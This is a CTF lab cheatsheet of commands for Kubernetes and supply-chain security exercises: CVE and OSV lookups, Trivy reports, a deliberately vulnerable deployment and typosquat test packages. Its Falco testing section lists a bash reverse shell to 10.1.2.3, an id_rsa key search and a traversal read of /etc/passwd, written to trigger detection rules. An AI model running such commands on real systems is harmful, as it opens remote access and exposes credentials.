# CTF Atlanta Cheatsheet
Reference repository for commands to progress in the CTF labs


## Flag 1
```
./exploit-check.sh  images namespace -A
```

```
./exploit-check.sh scan image openpolicyagent/gatekeeper:v3.13.4
```

```
./exploit-check.sh query CVE-2024-6345 --package-info
```


## Flag 5
```
curl -Ls https://kubernetes.io/docs/reference/issues-security/official-cve-feed/index.json | jq '.items[] | select(.id == "CVE-2017-1002100")'
```

```
curl -Ls https://kubernetes.io/docs/reference/issues-security/official-cve-feed/index.json | jq '.items[] | select((.summary | ascii_downcase | contains("podsecuritypolicy")) or (.content_text | ascii_downcase | contains("podsecuritypolicy")))'
```


```
curl -Ls https://kubernetes.io/docs/reference/issues-security/official-cve-feed/index.json | jq '.items[] | select(.id == "CVE-2020-8555")'
```

## Python scanning

```
kubectl get pods -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,IMAGES:.spec.containers[*].image'
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest pip list
```

Show everything in ```OSV``` for ```PIP``` packages
```
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest pip list 2>/dev/null | \
awk 'NR > 2 {if ($0 == "") exit; print $1, $2}' | \
while read -r pkg_name pkg_version; do
  echo "--- Checking $pkg_name v$pkg_version ---"
  curl -s -X POST https://api.osv.dev/v1/query \
       -H 'Content-Type: application/json' \
       -d "{\"package\":{\"ecosystem\":\"PyPI\",\"name\":\"$pkg_name\"},\"version\":\"$pkg_version\"}" | \
  jq .
done
```

Only return "```id```", "```summary```", and "```details```"
```
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest pip list 2>/dev/null | \
awk 'NR > 2 {if ($0 == "") exit; print $1, $2}' | \
while read -r pkg_name pkg_version; do
  echo "--- Checking $pkg_name v$pkg_version ---"
  curl -s -X POST https://api.osv.dev/v1/query \
       -H 'Content-Type: application/json' \
       -d "{\"package\":{\"ecosystem\":\"PyPI\",\"name\":\"$pkg_name\"},\"version\":\"$pkg_version\"}" | \
  jq '.vulns[] | { id, summary, details }'
done
```

## Scanning multiple package registries


|  Package Manager |    Ecosystem (Language/OS)    |         List Command       |
|   -----------    |        -------------          |         ------------       |
| ```apt```        | Debian/Ubuntu (System)        | ```apt list --installed``` |
| ```pip```        | **Python**                    | ```pip list```             |
| ```npm```        | **JavaScript (Node.js)**      | ```npm list```             |
| ```gem```        | Ruby                          | ```gem list```             |
| ```mvn```        | Java (Maven)                  | ```mvn dependency:list```  |
| ```apk```        | Alpine (System)               | ```apk info```             |


See all dependencies in a container (split out by upstream source)
```
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest npm list
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest gem list
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest pip list
```

Running a single docker run command that starts a shell (```sh```) inside the container. <br/>
From that shell, we can first check if a command exists before trying to run it.
```
docker run --rm docker.cloudsmith.io/acme-corporation/acme-repo-one/ai-image:latest \
sh -c '
for pm in npm gem pip; do
  echo "--- Checking $pm ---"
  if command -v $pm >/dev/null; then
    # If command exists, run its list command
    $pm list
  else
    # If command does not exist, print a clean message
    echo "No packages matched for $pm (command not found)"
  fi
  echo "" # Add a newline for cleaner formatting
done
' 2>/dev/null
```

## Kubernetes-specific CVEs
If you want a neat list of 2025 CVEs with key info:
```
curl -sL https://kubernetes.io/docs/reference/issues-security/official-cve-feed/index.json \
  | jq '.items 
        | map(select(.date_published | startswith("2025-"))) 
        | sort_by(.date_published) 
        | reverse 
        | map({id, date_published, summary})'
```

Or for a simple table output:
```
curl -sL https://kubernetes.io/docs/reference/issues-security/official-cve-feed/index.json \
  | jq -r '.items 
            | map(select(.date_published | startswith("2025-"))) 
            | sort_by(.date_published) 
            | reverse[] 
            | "\(.date_published)\t\(.id)\t\(.summary)"'
```

## OSV.dev filters
```
curl -s -X POST "https://api.osv.dev/v1/query" \
     -d '{"package": {"name": "aliyun-oss2", "ecosystem": "PyPI"}}' \
     | jq '.vulns[] | {id, summary}'
```

```
curl -s -X POST https://api.osv.dev/v1/query -d '{"package":{"ecosystem":"PyPI","name":"Django"},"version":"2.1"}' -H 'Content-Type: application/json' | \
jq '.vulns[] | . as $vuln | .affected[] | { id: $vuln.id, summary: $vuln.summary, severity: $vuln.database_specific.severity, "package name": .package.name, ecosystem: .package.ecosystem }'
```

```
curl -s -X POST https://api.osv.dev/v1/query -d '{"package":{"ecosystem":"PyPI","name":"Flask"},"version":"1.0.2"}' -H 'Content-Type: application/json' | \
jq '.vulns[] | . as $vuln | .affected[] | { id: $vuln.id, summary: $vuln.summary, severity: $vuln.database_specific.severity, "package name": .package.name, ecosystem: .package.ecosystem }'
```

```
curl -s -X POST https://api.osv.dev/v1/query \
-H 'Content-Type: application/json' \
-d '{
  "package": {
    "ecosystem": "PyPI",
    "name": "Pillow"
  },
  "version": "9.0.0"
}' | \
jq '.vulns[]? | . as $vuln | .affected[]? | { id: $vuln.id, summary: $vuln.summary, severity: $vuln.database_specific?.severity, "package name": .package?.name, ecosystem: .package?.ecosystem }'
```

## Exploit Checker
```
wget https://raw.githubusercontent.com/ndouglas-cloudsmith/exploit-check/refs/heads/main/exploit-check.sh
chmod +x exploit-check.sh
```
If you need to update the scanner (EPSS records are refreshed daily), run the below command:
```
./exploit-check.sh update
```
To query a specific CVE (for example, CVE-2021-44228), run the below command:
```
./exploit-check.sh query CVE-2021-44228
```

## Trivy Operator

If you want to list all reports and extract only the 3 fields:
```
kubectl get configauditreports -A -o json \
  | jq -r '.items[] | .metadata.name as $name | .report.checks[] | [$name, .severity, .checkID, .description] | @tsv'
```

You can alternatively just filter for ```severity```, ```CheckID``` and ```Description```:
```
kubectl get configauditreport replicaset-insecure-worker-764dcb5c98 -n google \
  -o jsonpath='{range .report.checks[*]}{.severity}{"\t"}{.checkID}{"\t"}{.description}{"\n"}{end}'
```

Filtering only for ```HIGH``` severity misconfigurations on a given deployment:
```
kubectl get configauditreports replicaset-insecure-worker-764dcb5c98 -n google -o json \
  | jq '.report.checks[] | select(.severity == "HIGH")'
```


## Flag 7 deployment

```
kubectl create namespace flag7
cat <<'EOF' > deployment7.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ctf-vulnerable-app
  namespace: flag7
  labels:
    app: ctf-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: ctf-app
  template:
    metadata:
      labels:
        app: ctf-app
    spec:
      containers:
      - name: malware-test-container
        image: docker.cloudsmith.io/acme-corporation/acme-repo-one/malware-test-image:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          set -e

          echo "Updating apt cache and installing build dependencies for Pillow..."
          apt-get update
          apt-get install -y build-essential libjpeg-dev zlib1g-dev

          echo "Installing *additional* vulnerable dependencies (with --no-deps)..."

          # This is the corrected line with --no-deps
          /usr/local/bin/python -m pip install --no-deps "Django==2.1" "Pillow==9.0.0" "Flask==1.0.2"

          echo "Cleaning up apt cache..."
          rm -rf /var/lib/apt/lists/*

          echo "Installation complete. Starting original application...";
          python -m http.server 8080 --directory /app
        ports:
        - containerPort: 8080
EOF
kubectl apply -f deployment7.yaml
```

## Falco rule testing
```
kubectl exec -it developer-test-pod -n default -- sh -c "echo '#!/bin/sh' > /tmp/malicious.sh && echo 'echo \"I am a new executable!\"' >> /tmp/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh"
kubectl exec -it developer-test-pod -n default -- sh -c 'find / -name "id_rsa" 2>/dev/null'
kubectl exec -it developer-test-pod -n default -- sh -c 'bash -i >& /dev/tcp/10.1.2.3/4444 0>&1'
kubectl exec -it developer-test-pod -n default -- touch /var/log/auth.log
kubectl exec -it developer-test-pod -n default -- cat /usr/bin/../..//etc/passwd
```

directory traversal:
```
kubectl logs -l app.kubernetes.io/name=falco -n falco -c falco | grep "directory traversal"
```
```
kubectl create namespace google
kubectl apply -f https://raw.githubusercontent.com/ndouglas-cloudsmith/kcd-uk-2025/refs/heads/main/bad-deployment.yaml
kubectl apply -f https://raw.githubusercontent.com/ndouglas-cloudsmith/kcd-uk-2025/refs/heads/main/bad-config.yaml
kubectl apply -f https://raw.githubusercontent.com/GoogleCloudPlatform/microservices-demo/refs/heads/main/release/kubernetes-manifests.yaml -n google
kubectl apply -f https://raw.githubusercontent.com/ndouglas-cloudsmith/kcd-uk-2025/refs/heads/main/malicious-config.yaml  -n google
kubectl apply -f https://raw.githubusercontent.com/ndouglas-cloudsmith/kcd-uk-2025/refs/heads/main/dummy-config.yaml -n google
```

Workflow for testing typosquatting policy in Cloudsmith
```
mkdir reuests-test
cd reuests-test
echo "from setuptools import setup; setup(name='reuests', version='71.71.72', description='Fake package for testing OSV', packages=[])" > setup.py
python3 setup.py sdist bdist_wheel
cloudsmith push python acme-corporation/acme-repo-one dist/reuests-71.71.72-py3-none-any.whl
```

Need to create a Docker container that we know contains malware and several vulnerabilities for the scanner
```
ORG="acme-corporation"
REPO="acme-repo-one"
IMAGE_NAME="osv-test-image"
TAG="latest"
TARGET_IMAGE="docker.cloudsmith.io/$ORG/$REPO/$IMAGE_NAME:$TAG"


mkdir -p build_artifacts
cd build_artifacts

echo "--- Step 1: Creating Fake Package 'reuests' ---"
mkdir -p reuests
echo "from setuptools import setup; setup(name='reuests', version='71.71.72', description='Fake malicious package', packages=[])" > reuests/setup.py
# Build Wheel
cd reuests && python3 setup.py bdist_wheel -d ../dist && cd ..

echo "--- Step 2: Creating Fake Package 'fabrice' ---"
mkdir -p fabrice
echo "from setuptools import setup; setup(name='fabrice', version='6.6.6', description='Fake malicious package 2', packages=[])" > fabrice/setup.py
# Build Wheel
cd fabrice && python3 setup.py bdist_wheel -d ../dist && cd ..

echo "--- Step 3: Downloading Real Package 'langflow' ---"
# We use --no-deps to keep the image small, only getting the specific wheel
pip download langflow==1.2.0 --dest dist --no-deps

echo "--- Step 4: Creating Dockerfile ---"
cat <<EOF > Dockerfile
FROM python:3.11-slim

WORKDIR /app

# Copy the wheels we just created/downloaded
COPY dist/*.whl ./

# Install them. 
# This generates the .dist-info folders that OSV scanners look for.
RUN pip install *.whl

# Clean up wheels to simulate a clean environment (optional, but cleaner)
RUN rm *.whl

CMD ["python3", "-c", "print('Vulnerable image loaded')"]
EOF

echo "--- Step 5: Building and Pushing to Cloudsmith ---"


# Build the image
docker build -t $TARGET_IMAGE .

# Push the image
docker push $TARGET_IMAGE

echo "Done! Image pushed to: $TARGET_IMAGE"
```
